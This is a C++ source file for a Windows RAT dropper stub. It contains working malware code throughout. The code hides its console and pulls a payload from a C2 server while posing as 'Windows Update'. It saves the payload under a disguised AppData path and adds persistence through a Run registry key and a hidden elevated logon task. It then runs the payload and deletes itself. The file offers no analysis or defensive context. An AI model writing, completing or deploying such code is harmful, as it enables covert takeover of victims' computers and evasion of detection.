#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <shlobj.h>
#include <iostream>
#include <fstream>
#include <cstring>
#include <string>
#include <vector>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shell32.lib")

// C2 server address - compiled in by compile_stub.bat
#ifdef C2_SERVER_STR
#define _STR2(x) #x
#define _STR(x) _STR2(x)
const char* C2_SERVER = _STR(C2_SERVER_STR);
#undef _STR2
#undef _STR
#else
const char* C2_SERVER = "127.0.0.1";
#endif

const int HTTP_PORT = 8081;
const int C2_PORT = 4444;

// Download the real RAT payload from the bridge HTTP server
bool DownloadPayload(const char* savePath) {
    std::string url = std::string("http://") + C2_SERVER + ":" + std::to_string(HTTP_PORT) + "/api/rat/payload";
    
    HINTERNET hInternet = InternetOpenA("Windows Update", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) return false;
    
    HINTERNET hConnect = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return false;
    }
    
    std::vector<char> buffer;
    char temp[4096];
    DWORD bytesRead;
    
    while (InternetReadFile(hConnect, temp, sizeof(temp), &bytesRead) && bytesRead > 0) {
        buffer.insert(buffer.end(), temp, temp + bytesRead);
    }
    
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    
    if (buffer.empty()) return false;
    
    HANDLE hFile = CreateFileA(savePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;
    
    DWORD written;
    WriteFile(hFile, buffer.data(), buffer.size(), &written, NULL);
    CloseHandle(hFile);
    
    return written == buffer.size();
}

// Add to Windows startup via registry
bool AddToStartup(const char* name, const char* path) {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS)
        return false;
    
    RegSetValueExA(hKey, name, 0, REG_SZ, (const BYTE*)path, strlen(path) + 1);
    RegCloseKey(hKey);
    return true;
}

// Create scheduled task for boot persistence
void CreateWatchdogTask(const char* exePath) {
    std::string cmd = std::string("schtasks /create /tn \"WindowsHelperTask\" /tr \"") + 
                      exePath + "\" /sc onlogon /rl highest /f";
    
    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi;
    
    CreateProcessA(NULL, const_cast<char*>(cmd.c_str()), NULL, NULL, FALSE, 
                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}

int main(int argc, char* argv[]) {
    HWND consoleWnd = GetConsoleWindow();
    if (consoleWnd) ShowWindow(consoleWnd, SW_HIDE);
    
    char pathBuf[260];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, pathBuf);
    pathBuf[259] = '\0';
    
    std::string installDir = std::string(pathBuf) + "\\Microsoft\\Windows\\Caches";
    std::string installPath = installDir + "\\winupdate.exe";
    
    CreateDirectoryA(installDir.c_str(), NULL);
    
    if (!DownloadPayload(installPath.c_str())) {
        Sleep(2000);
        if (!DownloadPayload(installPath.c_str())) {
            return 1;
        }
    }
    
    AddToStartup("WindowsHelper", installPath.c_str());
    CreateWatchdogTask(installPath.c_str());
    
    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi;
    
    if (CreateProcessA(installPath.c_str(), NULL, NULL, NULL, FALSE, 
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
    
    char selfPath[260];
    GetModuleFileNameA(NULL, selfPath, 260);
    
    std::string delCmd = std::string("cmd.exe /c timeout /t 2 /nobreak > nul & del /f /q \"") + selfPath + "\"";
    
    STARTUPINFOA siDel = { sizeof(siDel) };
    siDel.dwFlags = STARTF_USESHOWWINDOW;
    siDel.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION piDel;
    
    CreateProcessA(NULL, const_cast<char*>(delCmd.c_str()), NULL, NULL, FALSE, 
                   CREATE_NO_WINDOW, NULL, NULL, &siDel, &piDel);
    CloseHandle(piDel.hThread);
    CloseHandle(piDel.hProcess);
    
    return 0;
}
